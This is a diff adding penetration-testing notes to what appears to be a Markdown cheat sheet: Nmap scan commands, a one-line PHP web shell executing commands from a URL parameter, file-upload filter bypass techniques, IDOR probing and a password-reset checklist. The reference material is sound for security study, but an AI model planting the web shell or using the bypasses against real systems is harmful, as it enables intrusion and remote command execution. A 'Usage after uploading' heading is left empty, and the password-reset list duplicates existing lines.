@@ -1304,3 +1304,62 @@ Common password reset vulnerabilities to test:
 3. Weak or predictable token generation
 4. Token reuse across accounts
 5. No rate limiting on reset attempts
+## Infrastructure Penetration Testing
+
+### Nmap — Infrastructure Scanning Commands
+| Command | Description |
+|---------|-------------|
+| `nmap -sV target` | Probe open ports to identify service and version |
+| `nmap -sC target` | Run default Nmap scripts for extra details |
+| `nmap -oN scan.txt target` | Save scan output to a file |
+| `nmap -sV -sC -oN scan.txt target` | Full recommended scan |
+
+### Recommended Initial Infrastructure Scan
+```bash
+# Full service and script scan saved to file
+nmap -sV -sC -oN scan.txt target_ip
+
+# Aggressive scan with OS detection
+nmap -A -oN scan.txt target_ip
+
+# Full port scan with version detection
+nmap -p- -sV -oN scan.txt target_ip
+```
+
+## Web Penetration Testing
+
+### Creating a Web Shell
+```php
+<?php echo system($_GET['cmd']); ?>
+```
+
+**Usage after uploading:**
+### File Upload Bypass Techniques
+| Technique | Description |
+|-----------|-------------|
+| Alternative extensions | Try .php5, .phtml, .phar instead of .php |
+| Double extension | Try file.jpg.php or file.php.jpg |
+| MIME type manipulation | Change Content-Type header to image/jpeg |
+| Null byte injection | filename.php%00.jpg |
+| Capitalization | .PHP, .Php, .pHp |
+
+### IDOR Testing Methodology
+```bash
+# Step 1 — Find object references in URLs
+# Example: http://target.com/profile?id=1234
+
+# Step 2 — Try incrementing or changing the ID
+http://target.com/profile?id=1235
+http://target.com/profile?id=1233
+
+# Step 3 — Check if you can access other users data
+# Step 4 — Test in request headers and POST body too
+```
+
+### Password Reset Testing
+Common password reset vulnerabilities to test:
+1. Token exposed in HTTP response
+2. Token not expiring after use
+3. Weak or predictable token generation
+4. Token reuse across accounts
+5. No rate limiting on reset attempts
